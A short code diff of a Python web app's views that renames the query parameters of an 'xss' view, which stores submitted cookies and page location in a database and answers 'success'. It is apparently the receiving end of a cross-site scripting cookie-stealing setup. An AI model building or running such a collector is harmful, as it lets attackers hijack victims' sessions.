@@ -39,8 +39,8 @@ def live(request):
 
 
 def xss(request):
-    cookies = request.GET.get('cookies', '')
-    referer = request.GET.get('referer', '')
+    cookies = request.GET.get('cookie', '')
+    referer = request.GET.get('location', '')
     XSS.objects.create(cookies=cookies, referer=referer)
     return HttpResponse('success')
 
